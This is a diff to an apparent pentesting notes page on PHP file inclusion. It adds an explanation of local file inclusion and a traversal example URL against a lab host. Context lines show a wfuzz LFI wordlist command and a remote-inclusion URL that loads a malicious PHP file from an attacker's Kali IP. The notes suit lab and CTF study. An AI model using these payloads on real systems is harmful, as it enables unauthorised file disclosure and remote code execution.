@@ -1,8 +1,17 @@
+---
+description: A common vulnerability found in PHP web apps
+---
+
 # File Inclusion Vulnerabilities
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}
 
 ## Local File Inclusion (LFI)
+
+* The LFI attack is where an attacker can trick the web app into exposing or running files on the web server
+* Attempt dot-dot-slash attack to ensure the attack is possible
+
+Example: http://htb.local/?page=../../../../../../test.txt
 
 ### PoC
 
@@ -71,3 +80,5 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common nu
 Example:
 
 http://htb.local/?page=http://\<kali_IP:8000>/maliciou_s\_file.php
+
+<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
